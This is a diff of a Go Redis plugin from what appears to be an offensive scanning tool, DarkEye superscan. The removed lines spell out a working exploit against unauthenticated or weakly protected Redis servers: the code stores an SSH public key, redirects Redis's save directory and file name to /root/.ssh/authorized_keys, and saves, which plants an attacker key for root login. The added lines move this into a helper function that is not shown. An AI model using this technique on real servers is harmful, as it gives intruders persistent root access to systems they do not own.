@@ -2,9 +2,8 @@ package plugins
 
 import (
 	"context"
-	"fmt"
-	"github.com/go-redis/redis"
 	"github.com/b1gcat/DarkEye/superscan/dic"
+	"github.com/go-redis/redis"
 	"strings"
 	"time"
 )
@@ -24,28 +23,8 @@ func redisConn(parent context.Context, s *Service, _, pass string) (ok int) {
 	ctx, _ := context.WithCancel(parent)
 	defer func() {
 		if ok == OKDone || ok == OKNoAuth {
-			if !Config.Attack {
-				ret, err := client.ConfigSet(ctx, "dir", "/root/.ssh").Result()
-				s.parent.Result.Output.Set("helper", fmt.Sprintf("Try linux root access: '%v' error '%v'\n", ret, err))
-			} else {
-				if _, err := client.Set(ctx,
-					"OxOx", Config.SshPubKey, 0).Result(); err != nil {
-					s.parent.Result.Output.Set("helper", fmt.Sprintf("Redis attack: error '%v'\n", err))
-					return
-				}
-				if _, err := client.ConfigSet(ctx, "dir", "/root/.ssh").Result(); err != nil {
-					s.parent.Result.Output.Set("helper", fmt.Sprintf("Redis attack: error '%v'\n", err))
-					return
-				}
-				if _, err := client.ConfigSet(ctx, "dbfilename", "authorized_keys").Result(); err != nil {
-					s.parent.Result.Output.Set("helper", fmt.Sprintf("Redis attack: error '%v'\n", err))
-					return
-				}
-				if _, err := client.Save(ctx).Result(); err != nil {
-					s.parent.Result.Output.Set("helper", fmt.Sprintf("Redis attack: error '%v'\n", err))
-					return
-				}
-				s.parent.Result.Output.Set("helper", "Redis attack successfully\n")
+			if Config.Attack {
+				redisAttack(ctx, s, client)
 			}
 		}
 		_ = client.Close()
